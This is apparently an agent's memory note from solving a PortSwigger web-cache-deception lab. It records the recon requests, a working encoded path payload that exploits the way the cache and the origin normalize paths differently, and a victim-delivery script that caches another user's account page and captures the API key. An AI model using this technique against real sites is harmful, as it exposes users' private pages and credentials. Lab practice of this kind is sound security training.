---
metadata:
  node_type: memory
name: "Lab run WCD cache-server-normalization arm A"
description: "WCD cache-server-normalization solved: cache decodes %XX + resolves dot-segments, origin truncates at decoded '#', payload /my-account%23/..%2fresources/x.js"
last_updated: 2026-10-10T15:35:07+08:00
created: 2026-10-10T15:35:07+08:00
---

## 2026-xx (arm A, solved): web-cache-deception / cache server normalization

Target lab: lab-wcd-exploiting-cache-server-normalization (PortSwigger). Instance
0a03000a0344b487845e279300ae0008.web-security-academy.net, wiener:peter, victim carlos.

Recon (raw_matrix, byte-level request lines, per-variant status/X-Cache/digest/marker):
- Origin is not literal about /my-account: `/my-account/x.js` and `/aaa/../my-account` -> 404,
  but `/my-account%2f`, `/my-account%3f`, `/my-account%3f.js` -> 200 account page (it decodes
  %XX; `%3f`/`%23` end the path, so everything after is dropped).
- Static baseline `/resources/css/labs.css` -> X-Cache miss/hit with Cache-Control: max-age=30
  (cache TTL 30 s). `/my-account` itself -> no cache headers (never cached).

Normalization primitive (the lab name): the CACHE decodes %XX AND resolves dot-segments to build
its key, while the origin does not resolve. Proof: key(`/my-account%2f..%2fresources%2fX.js`)
== key(`/resources/X.js`) - seed request then /resources/X.js -> X-Cache hit, same body.

Working payload: `GET /my-account%23/..%2fresources%2f<name>.js`
- origin: decodes %23 -> `#` -> path is /my-account -> 200 with the requester's account page;
- cache: decodes %23/%2f, resolves the `..` segment -> `/resources/<name>.js` -> static
  extension -> stores it under that key for 30 s.
Readback: `GET /resources/<name>.js` within the TTL -> X-Cache hit, the stored page.

Exploit flow that worked: exploit server POST formAction=DELIVER_TO_VICTIM with responseHead
(real newlines) + responseBody `<script>fetch("https://LAB/my-account%23/..%2fresources%2fcarolk1.js",{credentials:"include",mode:"no-cors"})</script>`, --follow;
then GET /resources/carolk1.js -> carlos's page, username carlos, API key
bJSOtspsNz8xdl5JDXpKsGTWELeF869N. Lab banner did NOT flip on key theft alone; POST /submitSolution
answer=<key> -> {"correct":true}, then banner_verdict -> solved true + congrats line.

Traps hit: requesting the read URL before the victim seeds it caches a 404 under the same key
(poisons the window); literal `#` in a delivered URL is stripped by the browser (must be %23);
a literal `/../` segment is collapsed by the browser URL parser (use `%2f..%2f` or `..%2f`).

